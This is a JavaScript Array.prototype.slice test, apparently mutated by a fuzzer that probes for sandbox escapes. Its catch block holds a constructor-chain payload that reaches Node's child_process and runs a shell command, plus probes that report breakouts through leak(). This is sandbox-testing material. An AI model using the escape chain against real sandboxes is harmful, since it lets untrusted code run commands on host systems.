try {
    var obj = {};
    obj.slice = Array.prototype.slice;
    obj[4294967294] = 'x';
    obj.length = -1;
    var arr = obj.slice(4294967294, 4294967295);
    if (arr.length !== 0) {
        $ERROR('#1: var obj = {}; obj.slice = Array.prototype.slice; obj[4294967294] = "x"; obj.length = 4294967295; var arr = obj.slice(4294967294,4294967295); arr.length === 0. Actual: ' + arr.length);
    }
    if (arr[0] !== undefined) {
        $ERROR('#3: var obj = {}; obj.slice = Array.prototype.slice; obj[4294967294] = "x"; obj.length = 4294967295; var arr = obj.slice(4294967294,4294967295); arr[0] === undefined. Actual: ' + arr[0]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}